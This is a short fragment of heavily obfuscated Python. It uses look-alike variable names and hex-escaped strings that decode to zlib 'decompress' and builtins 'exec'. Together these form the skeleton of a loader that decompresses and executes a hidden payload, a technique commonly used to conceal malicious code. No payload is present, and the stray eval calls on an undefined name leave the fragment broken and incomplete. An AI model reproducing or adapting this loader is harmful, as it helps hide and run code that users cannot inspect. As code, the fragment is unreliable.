eval(NMNNMMMNNMNNMNMMNMNMNNNM)

WWXXWWXXWXWWXXXWXXWW,S222222SSSS22SSSS22222S222,nnmnnmnnmmmnnmnmnnnmmmnn,OoO00OOoo000Oo0OOo0,DOoOoODoOooOoOooo=(lambda NMNNMMMNNMNNMNMMNMNMNNNM:NMNNMMMNNMNNMNMMNMNMNNNM(zlib)),(lambda NMNNMMMNNMNNMNMMNMNMNNNM:eval(NMNNMMMNNMNNMNMMNMNMNNNM)),(lambda NMNNMMMNNMNNMNMMNMNMNNNM:NMNNMMMNNMNNMNMMNMNMNNNM['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda NMNNMMMNNMNNMNMMNMNMNNNM:eval(NMNNMMMNNMNNMNMMNMNMNNNM))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda O00oO00oOOO00O00o0O0o0Ooo,NMNNMMMNNMNNMNMMNMNMNNNM:O00oO00oOOO00O00o0O0o0Ooo(NMNNMMMNNMNNMNMMNMNMNNNM))

eval(NMNNMMMNNMNNMNMMNMNMNNNM)
